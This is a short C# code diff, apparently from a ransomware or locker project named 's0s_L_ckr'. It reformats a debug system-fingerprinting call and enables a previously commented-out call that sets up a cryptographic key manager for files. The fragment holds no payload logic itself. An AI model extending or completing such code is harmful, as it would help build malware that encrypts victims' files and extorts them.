@@ -25,13 +25,12 @@ namespace s0s_L_ckr
             //Debug Generation
 #if DEBUG
             string fingerprint = null;
-                        CompIdStrat.StickyFingerPrinter(ref fingerprint);
-
-                        Trace.WriteLine("[+] System FingerPrint: " + fingerprint);
+            CompIdStrat.StickyFingerPrinter(ref fingerprint);
+            Trace.WriteLine("[+] System FingerPrint: " + fingerprint);
 #endif
 
             // Criptographic Key Manager for Files
-            //CriptoKeyMgr.EnsrLocPubKey();
+            CriptoKeyMgr.EnsrLocPubKey();
 
             int resultVal = -1;
             ThreadStart threadStart = null;
